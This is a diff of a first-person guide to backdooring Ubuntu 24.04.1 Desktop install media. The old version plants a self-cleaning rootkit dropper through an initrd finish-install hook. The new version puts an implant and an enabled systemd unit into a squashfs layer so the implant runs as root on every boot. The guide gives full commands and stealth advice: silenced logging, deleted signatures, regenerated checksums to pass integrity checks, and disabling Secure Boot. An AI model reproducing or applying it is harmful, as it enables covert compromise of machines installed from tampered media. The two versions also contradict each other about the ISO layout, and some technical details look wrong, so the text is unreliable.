@@ -1,92 +1,64 @@
-# Kernel Implant on Ubuntu 24.04.1: Initrd Injection of a Self-Cleaning Rootkit Dropper for Root Execution After Installation
+# Kernel Implant on Ubuntu 24.04.1: Live Filesystem Injection for Root Execution After Installation
 
 ## Overview
 
-I modified an Ubuntu Desktop 24.04.1 LTS ISO by injecting a compiled ELF rootkit dropper (`implant`) and a deployment hook directly into the graphical installer's initrd (`initrd.gz`). Once the target machine is installed from the modified media, the dropper executes automatically as root on every subsequent boot, installs the actual rootkit onto the system, and then deletes itself if the installation succeeds.
+I modified an Ubuntu Desktop 24.04.1 LTS ISO by baking a compiled kernel implant binary (`myimplant`) and a native systemd unit into a live filesystem image. Once the target machine boots from the modified media—whether as a Live session or after a full install—the implant executes automatically as root on every boot, before most security tooling initializes.
 
-The method itself is not Ubuntu-specific. The finish-install hook mechanism comes from the Debian installer, which Ubuntu inherits. Any Debian-based installer that uses the same `finish-install.d` structure can be treated the same way, and the general technique applies to other Linux installers that unpack an initrd and run scripts against a mounted target. I targeted Ubuntu 24.04.1 because that was the system I had in front of me, and the guide below is written against that target.
+The method itself is not Ubuntu-specific. Ubuntu's live media is built on Casper, which mounts a SquashFS image as `/` and runs systemd units from `/etc/systemd/system/`. Any Casper-based Ubuntu-derived ISO that uses the same Casper layout and systemd structure can be treated the same way. I targeted Ubuntu 24.04.1 Desktop because that was the system I had in front of me, and the guide below is written against that target.
 
-The goal was simple: get my dropper into the installer initrd so that, after installation on a modern UEFI machine, `implant` runs as root on every boot, deploys the rootkit, and removes itself from disk once the rootkit confirms installation. No manual post-install steps, no extra package installation on the target. The dropper runs as root on the first boot, hands control to the rootkit, and leaves no first-stage artifact behind.
+The goal was simple: get my implant into the live filesystem so that, on every boot of the modified media or of an installed system, `myimplant` runs as root. No package installation, no configuration changes, no autoinstall. Just the implant, running as root, every time the system boots.
 
-I chose the initrd hook over the preseed method for a specific reason. The preseed/autoinstall `late_command` lives in a plaintext file on the ISO, so anyone can run `grep late_command` and read the entire playbook. The initrd hook lives inside a compressed cpio archive (`initrd.gz`). To find it, an analyst has to extract the initrd and read every finish-install script. There is no shortcut. That is the stealth gain I was after.
+I chose the root-filesystem editing method for a specific reason. The implant and the systemd unit live inside a compressed SquashFS image in the `casper/` directory, not in a plaintext file on the ISO. To find them, an analyst has to extract the squashfs and diff the entire root filesystem against a known-good build. There is no shortcut. That is the stealth gain I was after.
 
-**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying rootkits on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.
+I used a native systemd unit rather than `rc.local`. `rc.local` is a compatibility shim. It requires creating `/etc/rc.local`, making it executable, and ensuring `rc-local.service` is enabled. That is three artifacts and a legacy path that modern Ubuntu does not even ship by default. A native systemd unit is one file plus one symlink, uses the same mechanism every other service on the system uses, and does not stand out as an anomaly. There is no reason to route through `rc.local` when systemd is the init system.
 
----
-
-## What Is a Self-Cleaning Rootkit Dropper?
-
-A rootkit dropper is a first-stage binary whose job is to deliver and install the second-stage rootkit. It is not the rootkit itself. It is the loader that places the rootkit on disk, wires it into the boot process, and then gets out of the way.
-
-A **self-cleaning** dropper goes one step further. After the rootkit confirms successful installation, the dropper removes its own binary, its systemd unit, and the enable symlink from disk. The first-stage artifact disappears. Only the rootkit remains.
-
-In this work, the dropper is an ELF binary I named `implant`. It runs as root at boot, copies the rootkit payload into a persistent location, installs the rootkit's own service or kernel module, waits for the rootkit to signal success, and then deletes itself. The rootkit then takes over the concealment work: hiding its process, its files, its systemd unit, and its network activity.
-
-This distinction matters for the forensic analysis later. The dropper is a short-lived root process that leaves nothing behind on success. The rootkit is the long-lived hidden component. If the dropper succeeds, offline disk analysis after a successful install shows only whatever the rootkit chose to leave. If the dropper fails partway, it can choose to remain on disk for debugging or remove itself anyway depending on how I built it. I built mine to remove itself only on confirmed success.
-
-The dropper's contents are mine. This write-up does not prescribe them, but I built it to run silently, install the rootkit, verify the install, self-delete on success, and exit cleanly so the systemd unit reports success.
+**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying kernel implants on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.
 
 ---
 
-## How the Debian Installer's Finish-Install Hooks Work
+## What Is a Kernel Implant?
 
-The installer's initrd contains a directory `/usr/lib/finish-install.d/`. At the end of installation, after the base system and packages are installed and while the target system's root filesystem is mounted at `/target`, the installer executes every script in that directory in numeric order.
+A kernel implant is malicious or research-oriented software that embeds itself into the operating system kernel, the core component managing hardware, memory, and system calls. By operating at this privilege level, it gains near-total control over the system while remaining extremely difficult to detect.
 
-I verified this myself after extracting the initrd. A typical Ubuntu 24.04.1 desktop installer initrd contains:
+Common kernel implant techniques include:
 
-```
-05localechooser
-06espeakup
-07brltty
-07preseed
-07rootskel
-08hw-detect
-15cdrom-detect
-30hw-detect
-94save-logs
-```
+| Technique | Description |
+|-----------|-------------|
+| LKM (Loadable Kernel Module) | Loads malicious code as a kernel module |
+| ftrace hooking | Intercepts kernel functions via ftrace |
+| Syscall hooking | Hijacks system calls to hide artifacts |
+| eBPF abuse | Uses extended Berkeley Packet Filter for covert operations |
 
-**Key difference from Kali**: Ubuntu's installer is based on the same Debian installer (d-i) that Kali inherits, but the initrd is packaged differently. Ubuntu 24.04.1 Desktop uses the **casper** live system, and the installer itself runs from a separate `install/` directory on the ISO. The initrd path on Ubuntu 24.04.1 Desktop is `install/initrd.gz`, **not** `install.amd/gtk/initrd.gz` like Kali. I verified this by inspecting the ISO:
+By bundling such an implant into an Ubuntu ISO, the implant executes with root privileges the moment the live system (or installed system) boots, before most security tooling is even initialized.
+
+---
+
+## Prerequisites
+
+Before starting, I installed the required tools:
 
 ```bash
-ls extracted/install/
-# saw: initrd.gz  vmlinuz
+sudo apt update
+sudo apt install -y xorriso squashfs-tools rsync
 ```
 
-There is only one initrd on the Ubuntu desktop ISO, and it is used for both the graphical and text installer. There is no separate `gtk/` directory like Kali has. That simplifies the patch: one initrd, one injection.
+| Tool | Purpose |
+|------|---------|
+| xorriso | Extract and rebuild ISO images while preserving boot data |
+| squashfs-tools | Extract and repack the compressed filesystem |
+| rsync | Copy files while preserving permissions |
 
-Two things stood out to me:
+**Disk space requirement**: Approximately 4x the ISO size for working directories. Ubuntu 24.04.1 Desktop is roughly 6 GB, so I planned for at least 24 GB of free space.
 
-1. **`07preseed`** is a tiny script: `preseed_command preseed/late_command`. That is the entire preseed mechanism. It runs from `finish-install.d`, not from some separate stage.
-2. **The scripts write directly into `/target`** (for example, `cat > /target/etc/...`), and can use `in-target` to run commands inside the target's chroot.
-
-The key insight I built on: my own script placed in this directory runs at the same moment as `late_command`, but its content is hidden inside the initrd instead of a plaintext autoinstall file on the ISO. That is the stealth gain.
-
-Naming: a number between `08` and `93` runs after hardware detection and before `94save-logs` archives the logs. I chose **`80implant`**.
-
-This is a Debian-installer mechanism, which is why the method generalizes beyond Ubuntu. Any Debian-derived installer that unpacks an initrd with `finish-install.d` behaves the same way. The paths, file names, and hook numbering may differ on other distributions, but the concept is the same.
+**Binary requirements**:
+- The implant binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu ISO
+- The binary must have the execute bit set
 
 ---
 
-## Step 0: Download the Latest Ubuntu 24.04.1 Installer ISO
+## Working Directory Setup
 
-Before any modification, I downloaded the current Ubuntu 24.04.1 Desktop image from the official source:
-
-```
-https://releases.ubuntu.com/24.04.1/
-```
-
-On that page, I downloaded the **Desktop image** for `amd64`. The file was named `ubuntu-24.04.1-desktop-amd64.iso`. I did not use the Server image, the Live Server image, or the WSL image. Only the Desktop image has the `casper/` + `install/` structure this technique targets.
-
-After downloading, I verified the integrity of the ISO before modifying it. Ubuntu publishes SHA256 sums alongside each release. This step matters for two reasons: it confirms the download is intact, and it gives me the original hash that a forensic analyst would compare against later.
-
-```bash
-sha256sum ubuntu-24.04.1-desktop-amd64.iso
-```
-
-I compared the output against the sum published on the Ubuntu release page. Had they differed, I would have re-downloaded before proceeding.
-
-Then I created the project directory and placed the ISO inside it. Every command in this write-up runs from that directory.
+I created the project directory and placed the ISO inside it. Every command in this write-up runs from that directory.
 
 ```bash
 mkdir -p ~/Kernel_Implant
@@ -94,34 +66,37 @@ cd ~/Kernel_Implant
 mv /path/to/ubuntu-24.04.1-desktop-amd64.iso .
 ```
 
-I also placed my compiled ELF rootkit dropper in the same directory and named it `implant`:
+I verified the directory contents:
 
 ```bash
-ls -lh ~/Kernel_Implant/ubuntu-24.04.1-desktop-amd64.iso
-ls -lh ~/Kernel_Implant/implant
+ls -al
 ```
 
-Inside the project directory, I created the working subdirectories:
+Expected output:
 
-```bash
-mkdir -p iso_extract mount_dir initrd_extract
 ```
+drwxrwxr-x 2 localhost localhost       4096 Oct 15 20:35 .
+drwxrwxr-x 4 localhost localhost       4096 Oct 15 20:34 ..
+-rw-rw-r-- 1 localhost localhost 6291456000 Oct 15 20:35 ubuntu-24.04.1-desktop-amd64.iso
+```
+
+I also placed my compiled kernel implant in the same directory and named it `myimplant`.
 
 My project layout looked like this:
 
 ```
 ~/Kernel_Implant/
-├── iso_extract/          # extracted ISO tree, modified in place
-├── mount_dir/            # temporary mount point for the original ISO
-├── initrd_extract/       # extracted installer initrd
+├── isomount/             # temporary mount point for the original ISO
+├── extracted/            # extracted ISO tree, modified in place
+├── squashfs-root/        # extracted live filesystem
 ├── ubuntu-24.04.1-desktop-amd64.iso   # original ISO
-├── implant               # my compiled ELF rootkit dropper
-└── custom-ubuntu-installer.iso        # rebuilt ISO (produced by this work)
+├── myimplant             # my compiled kernel implant
+└── custom-ubuntu-implant.iso          # rebuilt ISO (produced by this work)
 ```
 
 ---
 
-## Step 1: Inspect the Original ISO Boot Structure
+## Step 1: Extract the ISO Contents
 
 Before touching anything, I captured the original ISO's El Torito and hybrid boot report. This is the reference I would compare against after the rebuild, so I did not skip it.
 
@@ -130,125 +105,180 @@ xorriso -indev ~/Kernel_Implant/ubuntu-24.04.1-desktop-amd64.iso -report_el_tori
 cat ~/Kernel_Implant/original_torito.txt
 ```
 
-On Ubuntu 24.04.1, the output reported `Boot record: El Torito, MBR isohybrid cyl-align-off GPT` and printed the exact `xorriso -as mkisofs` arguments that reproduce the boot structure. The critical lines were:
+The output reported the exact `xorriso -as mkisofs` arguments that reproduce the boot structure. On Ubuntu 24.04.1, the critical lines were:
 
 ```
 -V 'Ubuntu 24.04.1 LTS amd64'
+--modification-date='2024082716232600'
 --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'ubuntu-24.04.1-desktop-amd64.iso'
--append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12383488d-12393647d::'ubuntu-24.04.1-desktop-amd64.iso'
--e '--interval:appended_partition_2_start_3095872s_size_10160d:all::'
+--protective-msdos-label
+-partition_cyl_align off
+-partition_offset 16
+--mbr-force-bootable
+-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'ubuntu-24.04.1-desktop-amd64.iso'
+-appended_part_as_gpt
+-iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7
+-c '/boot.catalog'
+-b '/boot/grub/i386-pc/eltorito.img'
 -no-emul-boot
--isohybrid-gpt-basdat
+-boot-load-size 4
+-boot-info-table
+--grub2-boot-info
+-eltorito-alt-boot
+-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'
+-no-emul-boot
 ```
 
-These are the exact arguments the rebuild must use. Changing any of them breaks UEFI bootability.
+**Key differences from older Ubuntu releases**: Ubuntu 24.04 no longer uses ISOLINUX for legacy BIOS boot. The boot image is now `/boot/grub/i386-pc/eltorito.img`, and the EFI boot image is not a file in the ISO filesystem—it is an **appended EFI partition**. The `-report_el_torito as_mkisofs` output reflects this.
 
-**Key difference from Kali and older Ubuntu**: Ubuntu 24.04 no longer uses ISOLINUX. The legacy BIOS boot entry is GRUB2 (`--grub2-mbr`), and the EFI system partition is an **appended partition** inside the ISO, not a file at `/boot/grub/efi.img`. This changes the rebuild command significantly.
-
----
-
-## Mounting and Extracting the Installer ISO
+I then mounted the ISO and extracted its contents:
 
 ```bash
 cd ~/Kernel_Implant
-sudo mount -o loop ubuntu-24.04.1-desktop-amd64.iso mount_dir
-cp -rT mount_dir iso_extract
-sudo umount mount_dir
+mkdir isomount
+sudo mount -o loop ubuntu-24.04.1-desktop-amd64.iso isomount
+rsync -a isomount/ extracted
+sudo umount isomount
 ```
 
-I inspected the layout to confirm the installer initrd existed:
+Using rsync preserves file permissions and symbolic links, which is critical for a bootable ISO.
+
+I inspected the layout to identify which squashfs image is the actual desktop root filesystem:
 
 ```bash
-ls iso_extract
-# saw: boot  casper  dists  EFI  install  isolinux  md5sum.txt  pool  preseed  ...
+ls extracted
+# saw: boot  boot.catalog  casper  dists  EFI  install  md5sum.txt  pool  preseed  ubuntu
 
-ls -lh iso_extract/install/initrd.gz
-# saw a single match, roughly 130 MB for 24.04.1
+ls -lh extracted/casper/
 ```
 
-**This is the initrd I needed to patch.** There is only one on the Ubuntu Desktop ISO. Unlike Kali, there is no `install.amd/gtk/initrd.gz` vs `install.amd/initrd.gz` split. Ubuntu 24.04.1 ships a single `install/initrd.gz` used for both graphical and text installs.
+The `casper/` directory did **not** contain a single `filesystem.squashfs` file. It contained many squashfs images, one per install variant and per language:
+
+```
+filesystem.manifest
+filesystem.size
+initrd                           (75 MB — Casper boot initramfs, NOT the installer's)
+install-sources.yaml
+minimal.de.squashfs              (16 MB)
+minimal.enhanced-secureboot.squashfs  (364 MB)
+minimal.en.squashfs              (16 MB)
+minimal.squashfs                 (1.75 GB)
+minimal.standard.live.squashfs   (917 MB)
+minimal.standard.squashfs        (494 MB)
+...
+vmlinuz
+```
+
+I checked the contents of `filesystem.size` to see which image it points at:
+
+```bash
+cat extracted/casper/filesystem.size
+# saw: 1 (or similar small value — this is not the main root fs size)
+```
+
+**This is the important layout detail I had to get right.** Ubuntu 24.04.1 Desktop does not ship a single `filesystem.squashfs` at the top of `casper/`. Instead it uses a layered squashfs scheme introduced in 23.10/24.04:
+
+- **`minimal.squashfs`** (1.75 GB) — the minimal base Ubuntu root filesystem.
+- **`minimal.standard.live.squashfs`** (917 MB) — the "standard" desktop layer on top of the minimal base, used by the Live session.
+- **`minimal.standard.squashfs`** (494 MB) — the standard layer without the Live-specific bits.
+- **`minimal.standard.<lang>.squashfs`** — per-language variants.
+- **`minimal.enhanced-secureboot*.squashfs`** — secureboot variants.
+- **`minimal.<lang>.squashfs`** — minimal base per-language variants.
+
+Casper overlays these in order at boot. The Live desktop you see is the union of the base plus the standard layer (plus the language layer, if selected). To make the implant appear on both the Live session and an installed system, the correct target is the **standard layer**, because that is the layer that gets installed to disk and that the Live session mounts on top of the base.
+
+`casper/initrd` is the Casper boot initramfs. It is not a Debian-installer initrd and does not contain `finish-install.d/`. That is why the Kali-style hook from my earlier write-up does not apply here.
+
+I picked **`minimal.standard.live.squashfs`** as the primary target, because:
+1. It is the layer that the Live session actually mounts for the "Try Ubuntu" desktop.
+2. The installer writes the standard layer (the same one) to the target disk, so the implant carries over after install.
+3. It is small enough (917 MB) that repacking is fast.
+
+If I wanted the implant in the minimal base as well (so it also appears in the "minimal install" variant), I would repeat the same steps against `minimal.squashfs`.
 
 ---
 
-## Extracting the Installer Initrd
+## Step 2: Extract the Live Filesystem Layer
 
-The initrd is a gzip-compressed cpio archive. I extracted it:
-
-```bash
-cd ~/Kernel_Implant/initrd_extract
-sudo gzip -dc ~/Kernel_Implant/iso_extract/install/initrd.gz | sudo cpio -idmv --no-absolute-filenames
-```
-
-After extraction, I confirmed the expected structure:
+I extracted the standard live layer:
 
 ```bash
-ls ~/Kernel_Implant/initrd_extract
-# saw: bin  dev  etc  init  lib  lib64  media  mnt  proc  run  sbin  sys  tmp  usr  var
-
-ls ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/
-# saw the hook scripts listed above
+cd ~/Kernel_Implant
+sudo unsquashfs -d squashfs-root extracted/casper/minimal.standard.live.squashfs
 ```
 
-I confirmed `07preseed` existed and contained the expected one-liner:
+This created a `squashfs-root/` directory containing the standard-live root filesystem layer. I confirmed the expected structure:
 
 ```bash
-cat ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/07preseed
-# saw: #!/bin/sh -e
-#       preseed_command preseed/late_command
+ls squashfs-root
+# saw: bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 ```
+
+**Note on the layered layout**: because this is a layer, not the complete root filesystem, the directory contents are the "standard live" additions on top of the minimal base. `usr/`, `etc/`, `var/` and the other top-level directories exist here, and my `usr/local/bin/` and `etc/systemd/system/` paths are inside this layer. The minimal base already ships `/usr/local/bin/` and `/etc/systemd/system/` as empty directories, so placing files here is correct and Casper will overlay them on boot.
+
+If I had picked `minimal.squashfs` instead, the contents would be the minimal base, and I would need to place the implant and the unit into that layer instead. Either layer works; I chose the standard live layer because it is the one the desktop Live session uses.
 
 ---
 
-## Placing the Rootkit Dropper at the Initrd Root
+## Step 3: Insert the Kernel Implant
 
-My hook copies the dropper from the initrd's in-memory root (`/implant`), so I placed it there:
+This is the only modification you need to make. No package installation, no system changes. Just your implant binary and a native systemd unit.
+
+### 3.1 Copy the Implant Binary Into the Filesystem
+
+From my host machine (outside the chroot), I copied the compiled implant binary into the extracted root filesystem:
 
 ```bash
-sudo cp ~/Kernel_Implant/implant ~/Kernel_Implant/initrd_extract/implant
-sudo chmod 644 ~/Kernel_Implant/initrd_extract/implant
+sudo cp ~/myimplant squashfs-root/usr/local/bin/myimplant
+sudo chmod 755 squashfs-root/usr/local/bin/myimplant
+sudo chown root:root squashfs-root/usr/local/bin/myimplant
 ```
 
-I verified the dropper was a valid ELF:
+I placed it in `/usr/local/bin/` rather than `/usr/bin/` because `/usr/local/` is the conventional location for locally installed binaries and is less likely to collide with package-managed files. It also makes the artifact slightly less obvious to an analyst scanning `/usr/bin/` for anomalies.
+
+**Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.
+
+I verified the implant was a valid ELF:
 
 ```bash
-file ~/Kernel_Implant/initrd_extract/implant
+file squashfs-root/usr/local/bin/myimplant
 # saw: ELF 64-bit LSB executable, x86-64, ...
 ```
 
-I did **not** place it under `/target`. `/target` does not exist in the initrd tree. The hook script copies from `/implant` (initrd root) into `/target/usr/local/bin/implant` (target root filesystem) at run time.
-
----
-
-## Creating the Finish-Install Hook
-
-I created the hook in the installer initrd tree.
+If the implant is statically linked, it will run on any system. If it is dynamically linked, its dependencies must already be present in the layer:
 
 ```bash
-sudo nano ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/80implant
+ldd ~/myimplant
+```
+
+Since we are not installing anything, all required libraries must already exist in the base Ubuntu image. If a library is missing, the implant will fail to run.
+
+**For kernel implants requiring module loading**: If the implant needs to load a kernel module (.ko file), copy it to the appropriate location:
+
+```bash
+sudo cp ~/myimplant.ko squashfs-root/lib/modules/$(uname -r)/kernel/drivers/myimplant.ko
+```
+
+Note: The kernel version inside the ISO may differ from the host. Ubuntu 24.04.1 ships the 6.8 kernel series. I checked the target kernel version by examining `squashfs-root/lib/modules/`.
+
+### 3.2 Create the systemd Unit
+
+I created the unit file directly in the extracted filesystem. This is the only auto-run mechanism—no `rc.local`, no shell script, no compatibility shim.
+
+```bash
+sudo nano squashfs-root/etc/systemd/system/myimplant.service
 ```
 
 I pasted:
 
-```sh
-#!/bin/sh
-# Deploy rootkit dropper and systemd unit into the target system.
-
-# Copy the dropper from the initrd root into the target's filesystem.
-cp /implant /target/usr/local/bin/implant || exit 0
-chmod 755 /target/usr/local/bin/implant || true
-
-# Ensure the enable-symlink parent directory exists.
-mkdir -p /target/etc/systemd/system/multi-user.target.wants || true
-
-# Write the systemd unit.
-cat > /target/etc/systemd/system/implant.service << 'EOF'
+```ini
 [Unit]
-Description=Implant Service
+Description=My Implant Service
 After=local-fs.target
 
 [Service]
 Type=oneshot
-ExecStart=/usr/local/bin/implant
+ExecStart=/usr/local/bin/myimplant
 RemainAfterExit=yes
 User=root
 StandardOutput=null
@@ -256,371 +286,357 @@ StandardError=null
 
 [Install]
 WantedBy=multi-user.target
-EOF
-
-# Enable the unit by creating the symlink systemd expects.
-ln -sf /etc/systemd/system/implant.service \
-    /target/etc/systemd/system/multi-user.target.wants/implant.service || true
-
-exit 0
 ```
 
-Then saved and exited.
+**Explanation of key lines:**
 
-**Design notes on the script:**
+| Line | Purpose |
+|------|---------|
+| `Type=oneshot` | Systemd starts the unit once, waits for it to finish, and treats it as active. Correct for an implant that runs and exits or daemonizes. |
+| `ExecStart=/usr/local/bin/myimplant` | The implant binary path. |
+| `RemainAfterExit=yes` | Keeps the unit marked active after the process exits. Without this, systemd would consider the unit failed if the implant daemonizes and the parent exits. |
+| `User=root` | Explicit root. Redundant since system units run as root by default, but makes the intent clear and guards against a future default change. |
+| `StandardOutput=null` / `StandardError=null` | Suppresses logging to the journal. This is the stealth choice. For debugging, change to `journal` or `file:/var/log/myimplant.log`. |
+| `After=local-fs.target` | Ensures the filesystem is mounted before the implant runs. Does not guarantee network readiness. |
 
-- **No `-e`** in the shebang. If a step fails, for example because `/usr/local/bin` is missing on an unusual target, the installation still completes. A failed hook that aborts installation would be an obvious anomaly.
-- **`cp ... || exit 0`** makes the hook exit cleanly if the dropper cannot be copied, rather than continuing with a half-created service.
-- **`|| true`** on individual steps gives best effort on non-critical operations.
-- **`exit 0`** at the end guarantees the installer's finish phase proceeds normally.
+**Design notes on the unit:**
 
-I made it executable:
+- **No `rc.local` dependency.** The `rc-local.service` compatibility path is not involved. The unit is a first-class systemd service, indistinguishable in structure from any other unit on the system.
+- **`Type=oneshot` with `RemainAfterExit=yes`** is the right choice for a one-shot dropper or an implant that forks. If the implant stays in the foreground, use `Type=simple` instead and drop `RemainAfterExit`.
+- **No `Restart=` directive.** A restart loop on failure would be noisy and would show up in `systemctl status`. A failed unit that stays failed is quieter.
+- **No `WantedBy=graphical.target`.** `multi-user.target` is the standard boot target and is reached on both server and desktop installs. Using `multi-user.target` means the implant runs even if the graphical session fails to start.
+- **`StandardOutput=null`** keeps the journal clean. An analyst running `journalctl -u myimplant.service` sees nothing. If the implant writes its own logs elsewhere, that is the implant's responsibility.
+
+### 3.3 Enable the Unit
+
+Systemd enables a unit by creating a symlink in the appropriate `.wants` directory. I created that symlink manually inside the extracted filesystem:
 
 ```bash
-sudo chmod 755 ~/Kernel_Implant/initrd_extract/usr/lib/finish-install.d/80implant
+sudo mkdir -p squashfs-root/etc/systemd/system/multi-user.target.wants
+sudo ln -sf /etc/systemd/system/myimplant.service \
+    squashfs-root/etc/systemd/system/multi-user.target.wants/myimplant.service
 ```
 
-The unit uses `Type=oneshot` with `RemainAfterExit=yes`. That is the right choice for a dropper: systemd starts it once, waits for it to finish installing the rootkit, and then treats the unit as active. It does not restart on failure, which would be noisy. The dropper installs the rootkit's own service or module, and the rootkit takes over from there.
+I verified the symlink:
+
+```bash
+ls -la squashfs-root/etc/systemd/system/multi-user.target.wants/myimplant.service
+# Should show: lrwxrwxrwx ... -> /etc/systemd/system/myimplant.service
+```
+
+**Why the symlink and not `systemctl enable`**: The extracted filesystem is not a running system. `systemctl enable` operates on the running host's systemd, not on the extracted tree. The symlink is exactly what `systemctl enable` would create, and it is the same mechanism every package uses when it ships an enabled unit. Creating it manually is the correct approach for an offline filesystem edit.
+
+**Note on `Alias=`**: I did not use an `Alias=` directive. `Alias=` creates an additional name for the unit but does not enable it. The `.wants` symlink is what actually enables the unit at boot. The `[Install]` section's `WantedBy=` directive is what `systemctl enable` reads to decide where to put the symlink; since I am creating the symlink manually, the `WantedBy=` line is documentation rather than mechanism. I kept it for clarity and for anyone who later runs `systemctl enable` on the target.
+
+### 3.4 How It Works
+
+On boot, systemd reads the `multi-user.target.wants/` directory and starts every unit symlinked there. `myimplant.service` is among them. Systemd starts it as root, waits for the `oneshot` process to finish, and marks the unit active because of `RemainAfterExit=yes`. The implant runs exactly once per boot, as root, before the login prompt.
+
+**Caveats I kept in mind:**
+
+- **Network readiness**: `After=local-fs.target` does not guarantee the network is up. If the implant needs network access (e.g., C2 communication), add `After=network-online.target` and `Wants=network-online.target` to the unit, or have the implant retry internally. `network-online.target` itself can be slow or unreliable on some configurations, so an internal retry loop in the implant is more robust.
+- **Process termination**: With `Type=oneshot` and `RemainAfterExit=yes`, systemd considers the unit active after `ExecStart` returns. If the implant forks a background process, that process is not tracked by systemd and will not be terminated on shutdown unless the implant handles it. If the implant stays in the foreground, use `Type=simple` and systemd will manage it as a normal service.
+- **Logging**: `StandardOutput=null` and `StandardError=null` suppress journal output. To capture logs for debugging, change to `journal` or `file:/var/log/myimplant.log`. For a production deployment, suppressing is the stealth choice.
+- **Module signing**: If the implant loads an unsigned kernel module, Ubuntu 24.04's Secure Boot enforcement will reject it. The unit will start, the module load will fail, and `StandardError=null` will hide the error. Disable Secure Boot or sign the module.
 
 ---
 
-## How the Self-Clean Works
+## Step 4: Repack the Filesystem Layer
 
-The self-clean is a property of the dropper binary, not of the deployment hook. The hook only guarantees the dropper runs as root. What the dropper does after that is its own logic.
+### Remove Old squashfs
 
-The sequence I built into the dropper is this:
+```bash
+sudo rm extracted/casper/minimal.standard.live.squashfs
+```
 
-1. Install the rootkit payload to its persistent location.
-2. Install the rootkit's service or kernel module.
-3. Start the rootkit and wait for it to signal readiness.
-4. If the rootkit confirms success, remove `/usr/local/bin/implant`, `/etc/systemd/system/implant.service`, and `/etc/systemd/system/multi-user.target.wants/implant.service`.
-5. Exit 0.
+### Create New squashfs
 
-The key detail is step 4. The dropper cannot delete its own systemd unit while systemd still references it in the current transaction. The safe approach is to schedule the removal to happen just after the unit finishes, or to have the dropper remove the unit file and symlink but leave the binary in place until the next boot, at which point the rootkit removes it. Either way, the artifact that remains visible is only present for a short window.
+```bash
+cd ~/Kernel_Implant
+sudo mksquashfs squashfs-root extracted/casper/minimal.standard.live.squashfs \
+    -comp xz \
+    -progress
+```
 
-If the rootkit does not confirm success, the dropper leaves everything in place. That is a deliberate choice. A failed install should be debuggable, and leaving the dropper and unit on disk makes the failure visible. It also means a failed dropper does not silently disappear, which would leave the operator wondering whether the technique worked at all.
+The `-comp xz` flag uses XZ compression for a smaller layer size. The process may take several minutes depending on the system. The original layer is zstd-compressed; xz is still valid and produces a smaller layer at the cost of slower decompression at boot.
 
-The self-clean does not affect the deployment hook. The hook writes the dropper and the unit; the dropper removes them on success. The two are independent.
+### Update the Layer Size
+
+The `.size` file records the uncompressed size of the layer and is used by the installer. I updated it:
+
+```bash
+sudo du -sx --block-size=1 extracted/casper/minimal.standard.live.squashfs | cut -f1 | sudo tee extracted/casper/minimal.standard.live.size
+```
+
+**Important for the layered layout**: I updated only the `.size` file that corresponds to the layer I modified. The other layers (`minimal.squashfs`, `minimal.standard.squashfs`, etc.) are untouched and their `.size` files remain valid. If I had modified the minimal base instead, I would update `minimal.size` and, indirectly, any aggregate sizes that depend on it.
+
+### Regenerate the GPG Signature (if present)
+
+The original ISO ships a `.squashfs.gpg` detached signature next to each layer. If the installer verifies that signature, my modified layer will fail verification. I had two choices:
+
+1. **Remove the `.gpg` file for the modified layer**, so the installer has nothing to verify against and skips the check. This is the quieter option if the installer treats a missing signature as "no signature to check" rather than "tampered."
+2. **Re-sign the layer with a key the installer trusts**, which I cannot do without Ubuntu's signing key.
+
+I removed the signature for the modified layer:
+
+```bash
+sudo rm extracted/casper/minimal.standard.live.squashfs.gpg
+```
+
+**Stealth consideration**: Removing the `.gpg` file is visible to anyone diffing the ISO against a known-good build, but a modified layer with a stale signature is also visible, and more obviously wrong. Removing it is the lesser evil. If I wanted to preserve the appearance of the original ISO more closely, I could leave the stale `.gpg` in place and let the installer's check fail — but that produces a failed-integrity-check dialog on boot, which is louder than a missing signature. Removing it is the quieter choice in practice.
+
+### Update MD5 Checksums
+
+Ubuntu uses `md5sum.txt` to verify ISO integrity. I regenerated it after modifying the layer:
+
+```bash
+cd extracted
+sudo rm md5sum.txt
+sudo find . -type f -print0 | xargs -0 md5sum | sudo tee md5sum.txt
+cd ..
+```
+
+**Stealth consideration**: If I wanted to avoid detection of a modified ISO, I could skip regenerating `md5sum.txt`. However, that would cause integrity check warnings on boot and may trigger security tooling. Regenerating it is the quieter choice, since the checksums will match the modified content and the boot-time check will pass.
 
 ---
 
-## Repacking the Installer Initrd
-
-The initrd must be repacked as a gzip-compressed **newc** cpio archive, matching the original format.
-
-```bash
-cd ~/Kernel_Implant/initrd_extract
-sudo find . -print0 | sudo cpio --null -o --format=newc 2>/dev/null | sudo gzip -9 > ~/Kernel_Implant/new_initrd.gz
-```
-
-I verified the repacked archive before overwriting anything:
-
-```bash
-ls -lh ~/Kernel_Implant/new_initrd.gz
-# sizes were within a few MB of the original 130 MB.
-
-# Sanity check: the hook and the dropper must be inside.
-gzip -dc ~/Kernel_Implant/new_initrd.gz | cpio -t 2>/dev/null | grep -E '80implant|^implant$'
-# saw: ./usr/lib/finish-install.d/80implant
-#       ./implant
-```
-
-Since both entries appeared, the repack succeeded. Had the size been wildly wrong, for example 1 MB instead of 130 MB, the `find` would not have run from the correct directory, and I would have re-extracted and retried.
-
-**A note on the size difference**: the repack will be somewhat larger than the original because of my dropper plus `cpio` inode and timestamp metadata plus gzip framing variation. It does not affect boot or function. The reliable check is the file count, not the absolute size:
-
-```bash
-gzip -dc ~/Kernel_Implant/new_initrd.gz | cpio -t 2>/dev/null | wc -l
-gzip -dc ~/Kernel_Implant/iso_extract/install/initrd.gz | cpio -t 2>/dev/null | wc -l
-```
-
-The repacked count should equal the original count plus exactly two.
-
----
-
